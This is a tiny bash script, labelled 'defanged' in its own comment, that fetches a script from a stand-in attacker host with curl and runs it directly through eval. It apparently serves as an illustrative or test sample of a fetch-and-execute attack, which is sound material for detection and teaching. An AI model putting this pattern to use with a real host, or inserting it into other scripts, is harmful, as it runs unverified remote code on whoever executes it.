#!/usr/bin/env bash
# Defanged: pipes a remote script straight into eval.
URL="https://attacker.example/i"
eval "$(curl -fsSL "$URL")"
